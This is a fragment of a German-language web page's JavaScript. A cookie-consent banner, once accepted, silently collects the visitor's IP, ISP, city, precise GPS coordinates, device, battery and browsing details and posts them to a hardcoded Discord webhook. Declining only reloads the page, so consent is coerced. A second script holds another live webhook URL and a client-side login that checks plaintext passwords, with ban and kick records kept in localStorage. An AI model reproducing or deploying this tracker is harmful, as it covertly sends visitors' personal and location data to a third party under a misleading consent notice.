    }

    async function getBatteryStatus() {
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          const charging = battery.charging ? "🔌 Lädt" : "🔋 Nicht am Laden";
          const level = Math.round(battery.level * 100) + "%";
          return `${charging}, Akkustand: ${level}`;
        } catch {
          return "Keine Akku-Infos verfügbar";
        }
      } else {
        return "Akku-API nicht unterstützt";
      }
    }

    async function sendeDaten() {
      try {
        const ipInfo = await fetch("https://ipapi.co/json/");
        const data = await ipInfo.json();

        const ip = data.ip;
        const isVPN = data.security?.vpn ? "✅ VPN erkannt" : "❌ Kein VPN";
        const isp = data.org || "Unbekannt";
        const location = `${data.city}, ${data.region}, ${data.country_name}`;

        const userAgent = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const currentTime = new Date().toLocaleString();
        const screenSize = `${screen.width}x${screen.height}`;
        const cookiesEnabled = navigator.cookieEnabled ? "✅ Ja" : "❌ Nein";
        const deviceType = getDeviceType();
        const referrer = document.referrer || "Keine Referrer";
        const currentURL = window.location.href;
        const onlineStatus = navigator.onLine ? "✅ Online" : "❌ Offline";
        const touchSupport = ('ontouchstart' in window) ? "✅ Touchscreen vorhanden" : "❌ Kein Touchscreen";
        const batteryStatus = await getBatteryStatus();

        let geoCoords = "Kein GPS-Standort";
        function getPosition() {
          return new Promise(function(resolve) {
            if ("geolocation" in navigator) {
              navigator.geolocation.getCurrentPosition(
                function(position) { resolve(position.coords); },
                function() { resolve(null); },
                { timeout: 5000 }
              );
            } else {
              resolve(null);
            }
          });
        };

        const coords = await getPosition();
        if (coords) {
          geoCoords = `📍 GPS: Lat ${coords.latitude.toFixed(5)}, Lon ${coords.longitude.toFixed(5)}`;
        }

        const webhookURL = "https://discord.com/api/webhooks/1373746383764328590/j0mfg-dPr4cvjwMBiwy2itVBfP8gxM98fbnKv-maHxFJ0f7vVQWOEcL0ksY5WiSr1MGY";

        const message = `
📥 **Neue Verbindung (mit Zustimmung)**
🌍 IP: \`${ip}\`
🔒 VPN: ${isVPN}
🏢 Anbieter: ${isp}
📍 Standort: ${location}
${geoCoords}
🖥️ Gerätetyp: ${deviceType}
🌐 Browser: \`${userAgent}\`
🕓 Uhrzeit: ${currentTime} (${timezone})
🗣️ Sprache: ${language}
🖼️ Bildschirm: ${screenSize}
🍪 Cookies aktiviert: ${cookiesEnabled}
🔗 Referrer: ${referrer}
🔗 Aktuelle URL: ${currentURL}
🌐 Online-Status: ${onlineStatus}
👆 Touchscreen: ${touchSupport}
🔋 Akku: ${batteryStatus}
        `;

        await fetch(webhookURL, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({content: message.trim()})
        });

        console.log("✅ Daten erfolgreich gesendet.");
      } catch (err) {
        console.error("❌ Fehler beim Senden der Daten:", err);
      }
    }

    function acceptConsent() {
      // Zustimmung nicht speichern, damit immer wieder gefragt wird
      // localStorage.setItem("cookieConsent", "true"); // auskommentiert

      document.getElementById("cookieNotice").style.display = "none";
      document.body.style.overflow = "auto";
      sendeDaten();
    }

    function declineConsent() {
      location.reload();
    }
  </script>

<script>
const webhookURL = "https://discord.com/api/webhooks/1373923228711653457/ZNcgAmV4PVG6MsLVDe5Hcr7auXKgHlX7XS5QquQeje2viZJVpWVfLU1PPBlCO0m9Ji_e";

// Login Funktion
function loginUser() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    
    // Benutzer aus den vordefinierten Accounts überprüfen
    const user = users.find(function(u) {
        return u.username === username && u.password === password;
    });
    
    if (!user) {
        document.getElementById("errorMessage").textContent = "Ungültiger Benutzername oder Passwort";
        return;
    }
    
    // Login erfolgreich
    localStorage.setItem("currentUser", JSON.stringify(user));
    
    // Benutzer als online markieren
    updateUserStatus(user.username, 'online');
    
    // Chat-Interface erstellen
    createChatUI();
    
    // Weiterleitung basierend auf der Rolle
    if (user.role === "admin") {
        window.location.href = "admin.html";
    } else {
        window.location.href = "user.html";
    }

    // Login-Status in der Konsole ausgeben
    console.log("Login erfolgreich für:", username);

    // Benutzer-Interface aktualisieren
    const profileNameElement = document.getElementById("profile-name");
    if (profileNameElement) {
        profileNameElement.textContent = user.fullname || user.username;
    }

    const profileImageElement = document.getElementById("profile-image");
    if (profileImageElement) {
        const initial = (user.fullname || user.username).charAt(0).toUpperCase();
        profileImageElement.textContent = initial;
    }

        // Weiterleitung zum Dashboard
        document.getElementById("login-page").style.display = "none";
        document.getElementById("dashboard").style.display = "block";

        // Profilinformationen setzen
        const profileName = document.getElementById("profile-name");
        if (profileName) {
            profileName.textContent = user.fullname || user.username;
        }

        const profileImage = document.getElementById("profile-image");
        if (profileImage) {
            const initial = (user.fullname || user.username).charAt(0).toUpperCase();
            profileImage.textContent = initial;
        }

        alert("Anmeldung erfolgreich!");
}

// Bann und Kick Funktionen
function banUser(username, reason, duration) {
    const currentUser = JSON.parse(localStorage.getItem("currentUser"));
    if (!currentUser || currentUser.role !== "admin") {
        alert("Keine Berechtigung für diese Aktion!");
        return;
    }
    
    // Ban in localStorage speichern
    const bannedUsers = JSON.parse(localStorage.getItem('bannedUsers') || '[]');
    const banInfo = {
        username: username,
        reason: reason,
        duration: duration,
        bannedAt: new Date().toISOString(),
        bannedBy: currentUser.username
    };
    bannedUsers.push(banInfo);
    localStorage.setItem('bannedUsers', JSON.stringify(bannedUsers));
    
    showAnnouncement("Bann", `Der Benutzer ${username} wurde für ${duration} gebannt.\nGrund: ${reason}`);
}

function kickUser(username, reason) {
    const currentUser = JSON.parse(localStorage.getItem("currentUser"));
    if (!currentUser || currentUser.role !== "admin") {
        alert("Keine Berechtigung für diese Aktion!");
        return;
    }
    
    // Kick in localStorage speichern
    const kickedUsers = JSON.parse(localStorage.getItem('kickedUsers') || '[]');
    const kickInfo = {
        username: username,
        reason: reason,
        kickedAt: new Date().toISOString(),
        kickedBy: currentUser.username
    };
    kickedUsers.push(kickInfo);
    localStorage.setItem('kickedUsers', JSON.stringify(kickedUsers));
    
    showAnnouncement("Kick", `Der Benutzer ${username} wurde gekickt.\nGrund: ${reason}`);
}

function showAnnouncement(type, message) {
    // Container für Ankündigungen erstellen
    let container = document.getElementById("announcement-container");
    if (!container) {
        container = document.createElement("div");
        container.id = "announcement-container";
        container.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        `;
        document.body.appendChild(container);
    }

    // Neue Ankündigung erstellen
    const announcement = document.createElement("div");
    announcement.style.cssText = `
        background-color: ${type === "Bann" ? "#ff4444" : "#ff8800"};
        color: white;
        padding: 15px;
        border-radius: 5px;
        margin-bottom: 10px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        animation: slideIn 0.5s ease-out;
    `;

    // Titel
    const title = document.createElement("h3");
    title.style.margin = "0 0 10px 0";
    title.textContent = type + "-Ankündigung";
    announcement.appendChild(title);

    // Nachricht
    const text = document.createElement("p");
    text.style.margin = "0";
    text.style.whiteSpace = "pre-line";
    text.textContent = message;
    announcement.appendChild(text);

    // Ankündigung hinzufügen
    container.appendChild(announcement);

    // Nach 5 Sekunden ausblenden
    setTimeout(() => {
        announcement.style.animation = "fadeOut 0.5s ease-out";
        setTimeout(() => container.removeChild(announcement), 500);
    }, 5000);
}

// Animationen für Ankündigungen
const style = document.createElement("style");
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes fadeOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);
</script>
</body>
</html>
